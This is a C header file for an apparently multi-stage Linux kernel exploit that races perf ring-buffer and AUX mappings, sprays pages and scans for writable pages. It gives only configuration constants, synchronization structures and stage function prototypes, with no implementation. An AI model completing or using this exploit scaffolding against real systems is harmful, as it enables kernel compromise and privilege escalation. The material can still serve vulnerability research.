#ifndef __EXPLOIT_H__
#define __EXPLOIT_H__
#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include "util.h"
#include "perf.h"
#include "race_util.h"
//Exploit configuration
#define NUM_RACERS 2
#define TARGET_AUX_OFFSET TEST_AUX_OFFSET
#define TARGET_AUX_SIZE 0x8000000
#define TARGET_RB_SIZE 0x1000

#define PAGE_SIZE 4096

#define RACE_MAX_FOUND_OFFSET 5

#define RACE_DELAY_AVG 0
#define RACE_DELAY_RANGE 200
#define RACE_ACCESS_PAGE_DELAY 100000

#define TARGET_AUX_UNMAP_SIZE 0x8000000

#define RACE2_STEP_SIZE 100
#define RACE2_CATCH_SIZE 0x1000
#define RACE2_SAFETY_BUFFER_SIZE 0x8000

#define STAGE3_VAL1 ((char)(unsigned char)0x7f)
#define STAGE3_MMAP_SIZE PAGE_SIZE
//How many pages or what fraction are we trying to find
#define STAGE3_ABS_THRESHOLD 64
#define STAGE3_MAX_ITERATIONS 100
#define STAGE3_MIN_ITERATIONS 20

#define SPRAY_NUM 100

//Bookkeeping for exploit stages and synchronization for IPC
struct exp_sync_stage1
{
    struct race_barrier rdy_barrier;
    struct race_barrier result_barrier;
    volatile int mapped;
    volatile int race_mapped;
    volatile int redirected;
    volatile int caught_sigbus;
    volatile int usec_delay;
    volatile int usec_delay_min;
    volatile int usec_delay_max;
    volatile int race_done;
    volatile int race_counter;
    volatile int success;
    volatile void* extra_vma;
};

struct exp_sync_stage2
{
    struct race_barrier rdy_barrier;
    struct race_barrier result_barrier;

    volatile void* extra_vma;
    volatile int success;
    volatile int race_done;
    volatile void* faulted;
    volatile void* mapped_start;
    volatile void* mapped_end;
    volatile int caught_sigbus;

    volatile int mapped;

    volatile int usec_delay;
    volatile int usec_delay_min;
    volatile int usec_delay_max;
};

struct writable_page_info
{
    volatile int page_index;
    volatile void* writable_page;
};

struct spray_map_info
{
    volatile int fd;
    volatile void* map;
};

struct exp_sync_stage3
{
    volatile void* mapped_start;
    volatile void* mapped_end;

    struct race_barrier rdy_barrier;
    struct race_barrier spray_barrier;
    struct race_barrier change_barrier;
    struct race_barrier check_barrier;
    struct race_barrier result_barrier;

    volatile int spraying;
    volatile int spray_done;
    volatile int scanning;
    volatile int scan_done;
    volatile int req_change;
    volatile int change_done;
    volatile int finished;

    volatile int total_page_count;
    
    volatile int num_iterations;
    struct writable_page_info writable_pages[STAGE3_ABS_THRESHOLD];

    volatile int writable_page_count;
    struct spray_map_info spray_infos[SPRAY_NUM];
};

struct exp_sync
{
    int fd1;
    int fd2;
    struct exp_sync_stage1 stage1;
    struct exp_sync_stage2 stage2;
    struct exp_sync_stage3 stage3;
};
extern struct exp_sync *global_exp_data;
void* stage1_parent(void* args);
void* stage1_child(void* args);
void* stage2_parent(void* args);
void* stage2_child(void* args);
void stage3_parent();
void stage3_child();
int page_already_found(struct exp_sync_stage3 *exp_data, void* addr, int idx);
#endif